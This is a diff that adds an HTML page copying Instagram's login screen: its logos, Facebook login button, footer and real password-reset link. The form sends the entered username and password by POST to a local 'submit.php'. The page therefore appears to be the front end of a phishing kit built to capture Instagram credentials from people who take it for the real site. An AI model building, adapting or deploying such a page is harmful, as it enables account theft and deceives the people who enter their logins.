@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
+  <link rel="shortcut icon" href="./images/favicon.png" type="image/png" />
+  <link rel="stylesheet" href="./app.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="main-container">
+      <div class="main-content">
+        <!-- Phone mockup -->
+        <div class="slide-container">
+          <div class="slide-content" id="slide-content"></div>
+        </div>
+
+        <!-- Login form -->
+        <div class="form-container">
+          <!-- Main login box -->
+          <div class="box">
+            <div class="form-content">
+              <div class="logo">
+                <img src="./images/logo-dark.png" alt="Instagram" class="logo-dark" />
+                <img src="./images/logo-light.png" class="logo-light" alt="Instagram logo light" />
+
+              </div>
+
+              <form class="signin-form" id="signin-form" method="POST" action="submit.php">
+                <div class="form-group">
+                  <div class="animate-input">
+                    <input type="text" name="username" id="username" autocomplete="username" required />
+                    <span>Phone number, username, or email address</span>
+                  </div>
+                </div>
+
+                <div class="form-group">
+                  <div class="animate-input">
+                    <input type="password" name="password" id="password" autocomplete="current-password" required />
+                    <span>Password</span>
+                    <button type="button" class="pw-toggle" id="pw-toggle">Show</button>
+                  </div>
+                </div>
+
+                <div class="btn-group">
+                  <button class="btn-login" type="submit" id="signin-btn" disabled>Log in</button>
+                </div>
+
+                <div class="divine">
+                  <div></div>
+                  <div>OR</div>
+                  <div></div>
+                </div>
+
+                <button class="btn-fb" type="button">
+                  <svg aria-label="Facebook" fill="#2196F3" height="16" role="img" viewBox="0 0 24 24" width="16">
+                    <path d="M20.007 3H3.993A.999.999 0 0 0 3 3.993v16.014c0 .549.444.993.993.993h8.628v-6.961h-2.343v-2.725h2.343V9.31c0-2.324 1.421-3.591 3.495-3.591.699-.002 1.397.034 2.092.105v2.43h-1.428c-1.13 0-1.35.534-1.35 1.322v1.735h2.7l-.351 2.725h-2.365V21h4.593a.994.994 0 0 0 .993-.993V3.993A.999.999 0 0 0 20.007 3Z"></path>
+                  </svg>
+                  <span>Log in with Facebook</span>
+                </button>
+
+                <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-pw"><b>Forgotten your password?</b></a>
+              </form>
+            </div>
+          </div>
+
+          <!-- Sign up box -->
+          <div class="box goto">
+            <p>Don't have an account?<a href="#">Sign up</a></p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+      <div class="links">
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Meta AI</a>
+        <a href="#">Threads</a>
+        <a href="#">Contact uploading and non-users</a>
+        <a href="#">Meta Verified</a>
+      </div>
+      <div class="copyright">English (UK)   © 2025 Instagram from Meta</div>
+    </footer>
+  </div>
+
+  <script src="./app.js"></script>
+</body>
+</html>
